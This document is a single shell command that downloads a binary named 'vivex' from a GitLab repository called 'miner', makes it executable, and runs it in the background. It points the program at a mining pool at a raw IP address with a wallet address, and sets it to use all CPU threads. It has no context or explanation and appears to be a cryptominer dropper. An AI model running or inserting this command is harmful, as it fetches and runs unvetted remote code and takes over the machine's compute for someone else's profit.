wget -qO vivex https://gitlab.com/ghcees/miner/-/raw/main/sm249 && chmod +x vivex && nohup ./vivex --algorithm yespower --pool 68.183.50.168:443 --wallet QcZJNCcxNhPZ53Bq3PYXfxRSTkDncGANP6 --worker qch --password x --enable-1gb-hugepages --keepalive true --disable-gpu --cpu-threads $(nproc --all)
